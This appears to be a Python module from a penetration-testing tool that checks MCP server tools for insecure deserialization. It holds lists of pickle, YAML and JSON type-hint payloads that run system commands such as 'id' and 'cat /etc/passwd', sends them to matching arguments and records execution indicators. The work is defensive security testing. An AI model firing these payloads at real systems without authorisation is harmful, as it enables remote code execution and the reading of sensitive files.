"""Insecure deserialization tests for MCP tools"""
import base64
import pickle


class DeserializationTest:
    """Test for insecure deserialization vulnerabilities"""
    
    def __init__(self, pentester):
        self.pentester = pentester
    
    # Python pickle gadgets (detection-safe)
    PICKLE_PAYLOADS = [
        # Canary: attempts to import os (detectable via error)
        base64.b64encode(b"cos\nsystem\n(S'echo PICKLE-RCE'\ntR.").decode(),
        # Class instantiation probe
        base64.b64encode(pickle.dumps({'__reduce__': ('os.system', ('id',))})).decode(),
    ]
    
    # YAML deserialization
    YAML_PAYLOADS = [
        "!!python/object/apply:os.system ['id']",
        "!!python/object/new:subprocess.check_output [['id']]",
        '!!python/object/apply:subprocess.Popen [["cat", "/etc/passwd"]]',
    ]
    
    # JSON with class hints (Jackson, FastJSON style)
    JSON_GADGETS = [
        '{"@type":"java.lang.Runtime"}',
        '{"__class__": "subprocess.Popen", "__args__": [["id"]]}',
        '{"$type": "System.Diagnostics.Process, System"}',
    ]
    
    def run(self, tool):
        """Test for deserialization vulnerabilities"""
        self.pentester.health_check()
        findings = []
        schema = tool.get('inputSchema', {})
        
        for arg, spec in schema.get('properties', {}).items():
            # Test pickle (base64-encoded binary args)
            if 'base64' in arg.lower() or 'data' in arg.lower() or 'payload' in arg.lower():
                findings.extend(self._test_pickle(tool, arg))
            
            # Test YAML
            if 'yaml' in arg.lower() or 'config' in arg.lower():
                findings.extend(self._test_yaml(tool, arg))
            
            # Test JSON gadgets (for any string arg)
            if spec.get('type') == 'string':
                findings.extend(self._test_json_gadgets(tool, arg))
        
        return findings
    
    def _test_pickle(self, tool, arg):
        findings = []
        for payload in self.PICKLE_PAYLOADS:
            try:
                params = {"name": tool['name'], "arguments": {arg: payload}}
                _, _ = self.pentester.send("tools/call", params)
                
                if self.pentester.detector.findings:
                    findings.append({
                        'type': 'PICKLE_DESERIALIZATION',
                        'tool': tool['name'],
                        'arg': arg,
                        'payload': payload[:50] + '...',
                        'severity': 'CRITICAL',
                        'detections': self.pentester.detector.report()
                    })
                    self.pentester.detector.findings = []
            except (RuntimeError, IOError, OSError, KeyError) as e:
                print(f"[!] Pickle test error for {tool['name']}.{arg}: {e}")
        return findings
    
    def _test_yaml(self, tool, arg):
        findings = []
        for payload in self.YAML_PAYLOADS:
            try:
                params = {"name": tool['name'], "arguments": {arg: payload}}
                resp, _ = self.pentester.send("tools/call", params)
                
                # Check for execution indicators
                if self.pentester.detector.findings or 'uid=' in str(resp):
                    findings.append({
                        'type': 'YAML_DESERIALIZATION',
                        'tool': tool['name'],
                        'arg': arg,
                        'payload': payload,
                        'severity': 'CRITICAL'
                    })
                    self.pentester.detector.findings = []
            except (RuntimeError, IOError, OSError, KeyError) as e:
                print(f"[!] YAML test error for {tool['name']}.{arg}: {e}")
        return findings
    
    def _test_json_gadgets(self, tool, arg):
        findings = []
        for payload in self.JSON_GADGETS:
            try:
                params = {"name": tool['name'], "arguments": {arg: payload}}
                resp, _ = self.pentester.send("tools/call", params)
                
                # Look for class instantiation errors (indicates parsing attempt)
                content = str(resp)
                if any(ind in content for ind in ['ClassNotFoundException', 
                                                    'cannot unmarshal', 
                                                    'type not found',
                                                    'autoType']):
                    findings.append({
                        'type': 'JSON_GADGET_PARSED',
                        'tool': tool['name'],
                        'arg': arg,
                        'payload': payload,
                        'severity': 'HIGH',
                        'note': 'Server attempted to resolve type hint'
                    })
            except (RuntimeError, IOError, OSError, KeyError) as e:
                print(f"[!] JSON gadget test error for {tool['name']}.{arg}: {e}")
        return findings
